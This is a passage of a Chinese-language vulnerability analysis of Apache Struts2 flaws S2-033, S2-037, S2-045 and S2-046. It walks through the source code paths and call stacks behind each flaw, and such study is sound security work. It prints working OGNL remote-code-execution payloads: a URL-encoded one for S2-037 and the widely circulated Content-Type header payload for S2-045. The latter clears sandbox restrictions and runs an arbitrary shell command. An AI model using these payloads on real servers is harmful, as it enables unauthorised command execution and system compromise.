可以看到S2-033的payload是以.json结尾的。由于这个漏洞借助的REST插件。查看REST插件的配置文件`struts-plugin.xml`
```
<bean type="org.apache.struts2.dispatcher.mapper.ActionMapper" name="rest" class="org.apache.struts2.rest.RestActionMapper" />
...
<constant name="struts.action.extension" value="xhtml,xml,json" />
```
Struts2中`DefaultActionMapper`用来处理action请求。上述配置文件中将访问`xhtml,xml,json`也定义为action请求，并且由RestActionMapper来处理。所以需要将payload末尾设置成其中一个。

### S2-037
S2-037和S2-033也很类似，但是跳过了动态调用是否开启的判断，从(2)入手赋值method。但是xwork-core:2.3.28.1版本在OgnlUtil.isEvalExpression增加了isSequence的判断。然后payload采用了非Sequence形式的`(1)?(2):(3)`
```
(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=open -a Calculator.app
```

### S2-045
官方给出S2-045是基于Jakarta Multipart解析器，执行文件上传时可能造成RCE。在struts-core.jar中的default.properties文件中（如下）可以看到Struts对于Multipart类型默认的解析器是jakarta
```
# struts.multipart.parser=cos
# struts.multipart.parser=pell
# struts.multipart.parser=jakarta-stream
struts.multipart.parser=jakarta
```
这个漏洞最初的调用流程和其他漏洞不同。因为`Dispatcher.wrapRequest()`包装请求的时候有个判断`Context-Type`头部如果包含`multipart/form-data`，对Request的包装用的`MultiPartRequestWrapper`
```
if (content_type != null && content_type.contains("multipart/form-data")) { // 
    MultiPartRequest mpr = this.getMultiPartRequest();
    LocaleProvider provider = (LocaleProvider)this.getContainer().getInstance(LocaleProvider.class);
    request = new MultiPartRequestWrapper(mpr, request, this.getSaveDir(), provider, this.disableRequestAttributeValueStackLookup);
} else {
    request = new StrutsRequestWrapper(request, this.disableRequestAttributeValueStackLookup);
}
```
然后在触发请求时，对应的处理类就是`JakartaMultiPartRequest`。`JakartaMultiPartRequest.parse()`处理请求的代码如下
```
public void parse(HttpServletRequest request, String saveDir) throws IOException {
    try {
        this.processUpload(request, saveDir); // 如果不是以`multipart开头会走到catch`
    } catch (FileUploadException var6) {
        errorMessage = this.buildErrorMessage(var6, new Object[0]); // 对错误信息中的OGNL进行解析
    }
```
`processUpload()`后续是借助`commons-fileupload.jar`来处理文件上传。涉及到一个类`org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl`，它在初始化时会判断Content-Type是否以`multipart`开头，如果不是就抛出异常。
```
String contentType = ctx.getContentType();
if (null != contentType && contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/")) {}
else {
    throw new FileUploadBase.InvalidContentTypeException(String.format("the request doesn't contain a %s or %s stream, content type header is %s", "multipart/form-data", "multipart/mixed", contentType));
}
```
请求处理完，`DefaultActionInvocation`对Action进行拦截时会分发到`FileUploadInterceptor`
```
public String intercept(ActionInvocation invocation) throws Exception {
    if (!(request instanceof MultiPartRequestWrapper)) {...}
    else{ // 如果request是MultiPartRequestWrapper类型的
        MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper)request;
        if (multiWrapper.hasErrors()) { // 如果文件上传过程中存在错误
	    while(i$.hasNext()) {
	        LocalizedMessage error = (LocalizedMessage)i$.next();
	        if (validation != null) {
		    validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs())); // 错误信息 （漏洞修复时删除了此行）
                    }
                }
	}	
    }
}
```
看一下漏洞触发的调用栈，`LocalizedTextUtil.findText()`,会把错误信息提取出来，然后错误信息`the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is \payload\`会被`TextParseUtil.translateVariables()`进行处理。根据之前对这个方法的分析，处理时会将错误信息中的`${}`或`%{}`中的内容提取出来并进行计算。
```
DefaultActionInvocation.invoke()
  FileUploadInterceptor.intercept()
    LocalizedTextUtil.findText()
      LocalizedTextUtil.getDefaultMessage()
        TextParseUtil.translateVariables()
          OgnlTextParser.evaluate()
```
所以这个漏洞的一个成因在于，在Dispatcher时，Content-Type的要求是`contains("multipart/form-data")`，但是真正处理文件上传时要求以`multipart`开头。否则就报错，并对错误信息进行OGNL计算。那么就可以构造一个Content-Type头部包含`multipart/form-data`，但是又不以它开头的payload。网上流传最广的payload如下
```
Content-Type: %{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='open -a Calculator.app').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### S2-046
S2-046与S2-045很类似。同样是Jakarta Multipart解析器进行执行文件上传时报错造成了OGNL解析。`JakartaMultiPartRequest.parse()`解析还是定位到如下代码
```
public void parse(HttpServletRequest request, String saveDir) throws IOException {
    try {
        this.processUpload(request, saveDir); // 如果不是以`multipart开头会走到catch`
    } catch (FileUploadException var6) {
        errorMessage = this.buildErrorMessage(var6, new Object[0]); // 对错误信息中的OGNL进行解析
    }
```
只是这个漏洞processUploader报错的原因不是因为判断Content-Type是否以`multipart`开头
```java
protected void processUpload(HttpServletRequest request, String saveDir) throws FileUploadException, UnsupportedEncodingException {
    Iterator i$ = this.parseRequest(request, saveDir).iterator(); // 这里S2-045会对头部进行判断
    ...
    this.processFileField(item); // S2-046则是走到这步，判断item.getName()是否为null，后续调用checkFileName()判断上传文件名是否为空，
}
```
而是filname中包含`\u0000`造成报错
```java
public static String checkFileName(String fileName) {
    if (fileName != null && fileName.indexOf(0) != -1) {
        ...
        for(int i = 0; i < fileName.length(); ++i) {
	    char c = fileName.charAt(i);
   	    switch(c) {
	    case '\u0000':
	        sb.append("\\0");
	        break;
	    ...
	    }
        }
        throw new InvalidFileNameException(fileName, "Invalid file name: " + sb);
    }
} 
```
造成报错后续的执行流程与S2-045相同。所以关键在于报错方式的查找。网上还提到了Content-Length超过struts2上传允许的最大值而造成报错。

